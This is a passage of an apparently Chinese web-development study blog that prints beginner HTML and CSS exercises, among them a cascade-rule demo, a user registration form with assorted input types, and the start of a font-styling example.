class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>京东<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--&lt;frameset cols=&quot;30%,*&quot;&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&lt;frame src=&quot;http://www.baidu.com&quot; /&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&lt;frameset rows=&quot;20%,*&quot;&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&lt;frame src=&quot;http://www.youku.com&quot; /&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&lt;frame src=&quot;http://www.jd.com&quot; /&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&lt;/frameset&gt;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t&lt;/frameset&gt;--&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"层叠样式表-类选择器-html\"><a href=\"#层叠样式表-类选择器-html\" class=\"headerlink\" title=\"层叠样式表+类选择器.html\"></a>层叠样式表+类选择器.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- 外部样式表 --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;stylesheet&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;../css/style.css&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--内部样式表--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;header&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;a&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;b&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;c&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;d&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;e&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;f&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;g&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;c h big&quot;</span>&gt;</span>静夜思 - 李白<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t床前明月光</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;footer&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"层叠样式表2-html\"><a href=\"#层叠样式表2-html\" class=\"headerlink\" title=\"层叠样式表2.html\"></a>层叠样式表2.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--一般情况下网站的首页会使用内部样式表 - 首页正常渲染--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--其他的页面可以共享一个或多个外部样式表 - 代码复用/减少对带宽和流量的使用--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;stylesheet&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;../css/style.css&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--不冲突的样式会叠加，有冲突的样式遵循三条原则--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--1.就近原则--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--2.具体性原则--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--3.重要性原则--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#h1</span> &#123; <span class=\"attribute\">color</span>: blue;&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.h1</span> &#123; <span class=\"attribute\">color</span>: green <span class=\"meta\">!important</span>;&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.h1</span> &#123; <span class=\"attribute\">color</span>: pink <span class=\"meta\">!important</span>;&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">h1</span> &#123; <span class=\"attribute\">color</span>: red;&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--内嵌样式表 / 行内样式表 --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- rgba(255, 255, 0, 0.5)==#ffff00 rgba透明效果颜色设定--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!--hsl()灰度，饱和度，亮度颜色设定--&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;c big&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;background-color: rgba(255, 255, 0, 0.5); </span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tfont-family: &#x27;courier new&#x27;; text-align: center;&quot;</span>&gt;</span>hello world!<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;h1&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;h1&quot;</span>&gt;</span>Goodbye world!<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"表单-html\"><a href=\"#表单-html\" class=\"headerlink\" title=\"表单.html\"></a>表单.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>表单的例子 - 注册<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* 属性选择器input[type=text] */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* form input[type=text]后代选择器 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* form&gt;input[type=text] 儿子选择器 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">form</span> <span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=text]</span>, <span class=\"selector-tag\">form</span> <span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=password]</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: none; <span class=\"comment\">/*边框*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">outline</span>: none; <span class=\"comment\">/*轮廓*/</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-bottom</span>: <span class=\"number\">1px</span> dotted darkgray;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* 兄弟选择器 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">form</span>~<span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=text]</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">outline</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid lightgray;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"comment\">/* 相邻兄弟选择器 */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">form</span>+<span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=text]</span><span class=\"selector-pseudo\">:focus</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">outline</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#00FFFF</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.button</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">display</span>: inline-block;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: red;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">120px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">figure</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../images/163057jyrg229qerdeciod.jpg&quot;</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">figcaption</span>&gt;</span>图1：这是一个图片<span class=\"tag\">&lt;/<span class=\"name\">figcaption</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">figure</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;post&quot;</span> <span class=\"attr\">enctype</span>=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">fieldset</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">legend</span>&gt;</span>用户基本信息<span class=\"tag\">&lt;/<span class=\"name\">legend</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t用户名:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">size</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">maxlength</span>=<span class=\"string\">&quot;20&quot;</span> </span></span><br><span class=\"line\"><span class=\"tag\">\t\t\t\t\t<span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;用户名由6-20个字符构成&quot;</span> <span class=\"attr\">required</span>&gt;</span> <span class=\"comment\">&lt;!--placeholder占位符--&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\">&lt;!--readonly只读属性--&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t密码:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">required</span>&gt;</span> <span class=\"comment\">&lt;!--required必填属性--&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t确认密码:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;repassword&quot;</span> <span class=\"attr\">required</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t性别:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span>  <span class=\"attr\">type</span>=<span class=\"string\">&quot;radio&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> <span class=\"attr\">checked</span>&gt;</span>男</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span>  <span class=\"attr\">type</span>=<span class=\"string\">&quot;radio&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span>女</span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t爱好:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;fav&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;阅读&quot;</span> <span class=\"attr\">checked</span>&gt;</span>阅读</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;fav&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;旅游&quot;</span>&gt;</span>旅游</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;fav&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;美食&quot;</span> <span class=\"attr\">checked</span>&gt;</span>美食</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;fav&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;运动&quot;</span>&gt;</span>运动</span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\">&lt;!--下拉列表--&gt;</span></span><br><span class=\"line\">\t\t\t\t\t省份:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;province&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;110000&quot;</span>&gt;</span>北京<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;120000&quot;</span>&gt;</span>天津<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;310000&quot;</span>&gt;</span>上海<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;500000&quot;</span>&gt;</span>重庆<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;510000&quot;</span> <span class=\"attr\">selected</span>&gt;</span>四川省<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t生日:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;date&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;birthday&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">fieldset</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">fieldset</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">legend</span>&gt;</span>附加信息<span class=\"tag\">&lt;/<span class=\"name\">legend</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t邮箱:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">required</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t头像:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;photo&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t自我介绍:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">textarea</span> <span class=\"attr\">rows</span>=<span class=\"string\">&quot;10&quot;</span> <span class=\"attr\">cols</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;introduction&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">textarea</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;确认注册&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;reset&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;重置&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">fieldset</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"文本和字体属性-html\"><a href=\"#文本和字体属性-html\" class=\"headerlink\" title=\"文本和字体属性.html\"></a>文本和字体属性.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!--衬线字体，非衬线字体，等宽字体--&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"keyword\">@font-face</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&quot;FatDog&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;../fonts/动漫卡通/Dbbrnms.ttf&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.ms</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">letter-spacing</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">320px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">5px</span> dotted grey;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">line-height</span>: <span class=\"number\">100px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span 